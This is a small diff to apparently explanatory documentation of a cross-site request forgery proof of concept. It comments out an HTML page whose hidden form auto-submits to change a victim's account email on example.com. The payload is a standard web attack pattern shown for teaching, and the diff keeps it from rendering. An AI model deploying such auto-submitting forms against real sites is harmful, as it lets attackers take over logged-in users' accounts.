@@ -8,7 +8,7 @@ This PoC shows how a CSRF attack can trigger an action (such as changing an acco
 If the victim is logged in on the target site, their browser may automatically send cookies when this form is submitted.
 
 PoC Example 
-<html>
+<!--<html>
   <body>
     <form method="POST" action="https://example.com/my-account/change-email">
       <input type="hidden" name="email" value="test@example.com">
@@ -18,5 +18,5 @@ PoC Example
       document.forms[0].submit();
     </script>
   </body>
-</html>
+</html>-->
 
